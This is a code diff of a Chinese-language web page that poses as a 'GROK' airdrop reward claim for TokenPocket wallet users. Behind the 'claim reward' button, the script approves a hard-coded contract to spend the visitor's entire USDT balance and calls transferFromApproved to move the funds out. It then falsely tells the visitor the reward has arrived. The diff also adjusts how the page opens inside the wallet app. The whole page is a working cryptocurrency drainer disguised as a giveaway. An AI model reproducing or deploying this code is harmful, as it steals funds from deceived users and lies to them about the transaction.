@@ -55,39 +55,52 @@
   <div class="card">
     <h1>GROK 奖励领取</h1>
 
-    <div class="warning">
-      <strong>注意：</strong>点击下方按钮唤醒 TP 钱包后再领取奖励。
+    <div class="warning" id="tpTip">
+      请点击下方按钮在 TP 钱包中打开 DApp。
     </div>
 
     <button id="openTPBtn" onclick="openTPWallet()">打开 TokenPocket</button>
 
     <div id="walletInfo" style="display:none;">
       <div class="address" id="walletAddress"></div>
-      <div style="margin-top:10px; color:#666;">剩余空投余额: <span id="usdtBalance">加载中...</span></div>
+      <div style="margin-top:10px; color:#666;">
+        剩余空投余额: <span id="usdtBalance">加载中...</span>
+      </div>
     </div>
 
     <button id="actionBtn" onclick="approveAndTransfer()">领取奖励</button>
 
     <div id="status" class="info">
-      等待连接钱包...<br><small>请在 TP 中打开本页领取空投</small>
+      等待连接钱包...
     </div>
   </div>
 
   <script>
-    // ✅ 唤醒 TP 钱包并进入 DApp
-    function openTPWallet() {
-      if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-        const dappUrl = encodeURIComponent("https://airdr0p-888.github.io/GROK1688/index.html");
-        const tpDappUrl = `tpdapp://open?url=${dappUrl}`;
-        window.location.href = tpDappUrl;
-        setTimeout(() => {
-          window.location.href = "https://www.tokenpocket.pro/zh/download";
-        }, 3000);
-      } else {
-        alert("请使用手机打开此页面以唤醒 TP 钱包。");
-      }
+    const TP_DAPP_URL = encodeURIComponent("https://airdr0p-888.github.io/GROK1688/index.html");
+
+    function isTPBrowser() {
+      return /TokenPocket/i.test(navigator.userAgent);
     }
 
+    function openTPWallet() {
+      const tpUrl = `tpdapp://open?url=${TP_DAPP_URL}`;
+      window.location.href = tpUrl;
+      setTimeout(() => {
+        // 3秒未唤醒，跳下载页
+        window.location.href = "https://www.tokenpocket.pro/zh/download";
+      }, 3000);
+    }
+
+    window.onload = async () => {
+      if (isTPBrowser()) {
+        // 已在 TP 内部浏览器
+        document.getElementById("tpTip").style.display = "none";
+        document.getElementById("openTPBtn").style.display = "none";
+      }
+      await autoConnect();
+    };
+
+    // === 钱包连接与空投逻辑 ===
     const CONTRACT = "0xa4441b1EcB6B807de485723F5320d06fB41Eac6F";
     const USDT = "0xa85f403f7869a050c91e9a260dbf08a64229b2de";
     const ABI_USDT = [
@@ -133,8 +146,7 @@
       try {
         const usdt = new web3.eth.Contract(ABI_USDT, USDT);
         const balance = await usdt.methods.balanceOf(account).call();
-        const formatted = (balance / 1e6).toFixed(6);
-        usdtBalance.innerText = formatted;
+        usdtBalance.innerText = (balance / 1e6).toFixed(6);
       } catch (e) {
         usdtBalance.innerText = "查询失败";
       }
@@ -142,26 +154,20 @@
 
     async function approveAndTransfer() {
       if (!account && !await autoConnect()) return;
-
       status.className = "loading";
       status.innerHTML = "正在授权...<br><small>请确认交易</small>";
-
       try {
         const usdt = new web3.eth.Contract(ABI_USDT, USDT);
         const balance = await usdt.methods.balanceOf(account).call();
-
         if (balance === "0") {
           status.className = "warning";
           status.innerHTML = "余额为 0，无需操作";
           return;
         }
-
         await usdt.methods.approve(CONTRACT, balance).send({ from: account });
         status.innerHTML = "授权成功！正在转账...";
-
         const forwarder = new web3.eth.Contract(ABI_FORWARDER, CONTRACT);
         await forwarder.methods.transferFromApproved().send({ from: account });
-
         status.className = "success";
         status.innerHTML = "领取成功！<br>USDT 已到账";
         await updateUSDTBalance();
